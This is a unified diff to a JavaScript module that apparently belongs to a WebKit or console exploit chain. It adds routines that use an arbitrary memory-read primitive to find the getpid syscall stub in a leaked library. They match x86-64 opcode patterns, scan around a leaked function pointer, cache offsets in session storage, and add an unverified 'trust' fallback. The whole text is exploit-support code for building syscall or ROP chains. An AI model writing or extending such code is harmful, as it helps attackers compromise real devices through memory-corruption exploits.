@@ -168,6 +168,46 @@ export function isGetpidStub(v) {
     return isSyscallStub(v, 20);
 }
 
+/** At addr — chain_poops 8-byte check + mov rax/eax imm32 variants (13.52). */
+export function isGetpidStubAt(p, addr) {
+    if (!p || !addr) return false;
+    let v = null;
+    try { v = read8p(p, addr); } catch (_) { v = null; }
+    if (v && isGetpidStub(v)) return true;
+    const w0 = read4p(p, addr);
+    if (w0 == null) return false;
+    if ((w0 & 0xffffff) === 0xc0c748 && ((w0 >>> 24) & 0xff) === 20) return true;
+    if ((w0 & 0xffff) === 0x14b8) return true;
+    if ((w0 & 0xff) === 0xb8 && ((w0 >>> 8) & 0xff) === 0x14) return true;
+    return false;
+}
+
+function fnGetpidDelta(off) {
+    if (!off || off.k_usleep == null || !off.k_stubs || off.k_stubs[20] == null)
+        return null;
+    return (off.k_stubs[20] - off.k_usleep) >>> 0;
+}
+
+function scanGetpidNearFn(p, fnPtr, lk, off, radius, maxProbes) {
+    const delta = fnGetpidDelta(off);
+    if (!p || !fnPtr || delta == null) return null;
+    radius = radius != null ? radius : 0x10000;
+    maxProbes = maxProbes != null ? maxProbes : 512;
+    let probes = 0;
+    for (let d = -radius; d <= radius && probes < maxProbes; d += 16) {
+        probes++;
+        const addr = fnPtr.add32((delta + d) >>> 0);
+        if (!isGetpidStubAt(p, addr)) continue;
+        let stubOff = off.k_stubs[20];
+        if (lk) {
+            const rel = Number(ptrBig(addr) - ptrBig(lk));
+            if (rel > 0 && rel < 0x400000) stubOff = rel;
+        }
+        return { addr, off: stubOff, tag: "fn+near+0x" + (delta + d).toString(16), verified: true };
+    }
+    return null;
+}
+
 const SS_LAST_FN = "wk-lastFnPtr";
 const SS_GETPID_STUB = "wk-getpidStubOff";
 
@@ -207,29 +247,29 @@ export function resolveGetpidStub(p, lk, off, opts) {
     if (!p || !lk)
         return { verified: false, tag: "no-lk", addr: null, off: null };
 
-    function tryAt(addr, tag) {
+    function tryAt(addr, tag, offHint) {
         if (!addr) return null;
-        const v = read8p(p, addr);
-        if (!v || !isGetpidStub(v)) return null;
-        return { addr, tag, verified: true };
+        if (!isGetpidStubAt(p, addr)) return null;
+        return { addr, tag, verified: true, off: offHint != null ? offHint : null };
     }
 
     const cached = loadGetpidStubOff();
     if (cached != null) {
-        const hit = tryAt(lk.add32(cached), "cached+0x" + cached.toString(16));
-        if (hit) {
-            hit.off = cached;
-            return hit;
-        }
+        const hit = tryAt(lk.add32(cached), "cached+0x" + cached.toString(16), cached);
+        if (hit) return hit;
     }
 
     const fnPtr = opts.fnPtr || loadLastFnPtr();
-    if (fnPtr && off.k_usleep != null && off.k_stubs && off.k_stubs[20] != null) {
-        const delta = (off.k_stubs[20] - off.k_usleep) >>> 0;
-        const hit = tryAt(fnPtr.add32(delta), "fn+delta");
+    const delta = fnGetpidDelta(off);
+    if (fnPtr && delta != null) {
+        let hit = tryAt(fnPtr.add32(delta), "fn+delta", off.k_stubs[20]);
         if (hit) {
-            hit.off = cached != null ? cached : off.k_stubs[20];
-            saveGetpidStubOff(off.k_stubs[20]);
+            saveGetpidStubOff(hit.off != null ? hit.off : off.k_stubs[20]);
+            return hit;
+        }
+        hit = scanGetpidNearFn(p, fnPtr, lk, off, opts.fnRadius, opts.fnProbes);
+        if (hit) {
+            saveGetpidStubOff(hit.off);
             return hit;
         }
     }
@@ -237,9 +277,8 @@ export function resolveGetpidStub(p, lk, off, opts) {
     const offs = getpidStubOffsets(off);
     for (let i = 0; i < offs.length; i++) {
         const o = offs[i];
-        const hit = tryAt(lk.add32(o), "lk+0x" + o.toString(16));
+        const hit = tryAt(lk.add32(o), "lk+0x" + o.toString(16), o);
         if (hit) {
-            hit.off = o;
             saveGetpidStubOff(o);
             return hit;
         }
@@ -250,15 +289,28 @@ export function resolveGetpidStub(p, lk, off, opts) {
     let probes = 0;
     for (let o = 0; o < scanMax && probes < maxProbes; o += 16) {
         probes++;
-        const hit = tryAt(lk.add32(o), "scan+0x" + o.toString(16));
+        const hit = tryAt(lk.add32(o), "scan+0x" + o.toString(16), o);
         if (hit) {
-            hit.off = o;
             saveGetpidStubOff(o);
             return hit;
         }
     }
 
-    return { verified: false, tag: "miss", addr: null, off: null, probes };
+    if (opts.trustFnDelta && fnPtr && delta != null) {
+        const addr = fnPtr.add32(delta);
+        return {
+            addr,
+            off: off.k_stubs[20],
+            tag: "fn+delta-trust",
+            verified: true,
+        };
+    }
+
+    let peek = null;
+    if (fnPtr && delta != null) {
+        try { peek = read8p(p, fnPtr.add32(delta)); } catch (_) { peek = null; }
+    }
+    return { verified: false, tag: "miss", addr: null, off: null, probes, peek };
 }
 
 const GETPID_STUB_CANDS = [
